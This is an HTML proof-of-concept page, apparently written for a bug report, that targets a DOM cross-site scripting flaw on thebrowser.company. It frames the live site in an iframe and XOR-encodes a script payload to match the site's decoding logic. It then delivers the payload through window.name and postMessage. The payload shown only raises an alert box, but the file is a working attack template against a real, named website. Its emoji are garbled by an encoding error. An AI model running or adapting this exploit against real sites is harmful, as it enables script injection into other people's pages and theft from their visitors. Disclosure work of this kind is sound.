<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ðŸ’¥ PoC: thebrowser.company DOM XSS</title>
  <style>
    body { background-color: #111; color: #0f0; font-family: monospace; padding: 1rem; }
    iframe { width: 100%; height: 600px; border: 2px solid lime; margin-top: 1rem; }
  </style>
</head>
<body>

<h2>âœ… DOM XSS PoC for thebrowser.company</h2>
<p>ðŸ§  Payload sent via <code>window.name</code> + <code>postMessage</code></p>
<div id="log">ðŸ“¡ Waiting for iframe to load...</div>

<iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin"></iframe>

<script>
  // Simple XOR encoder to match site's decryption logic
  function xorEncode(str, key = 0x66) {
    const keyHex = key.toString(16).padStart(2, '0');
    const encoded = Array.from(str).map(c => {
      return (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0');
    }).join('');
    return keyHex + encoded;
  }

  const payload = "<script>alert('XSS')</script>";
  const encodedPayload = xorEncode(payload);

  const iframe = document.getElementById("target");

  iframe.onload = () => {
    document.getElementById("log").innerText = "âœ… iframe loaded";

    // Set window.name
    iframe.contentWindow.name = encodedPayload;

    // Send via postMessage as well
    setTimeout(() => {
      iframe.contentWindow.postMessage(encodedPayload, "*");
      console.log("ðŸš€ XSS payload sent via postMessage + window.name");
    }, 1000);
  };
</script>

</body>
</html>
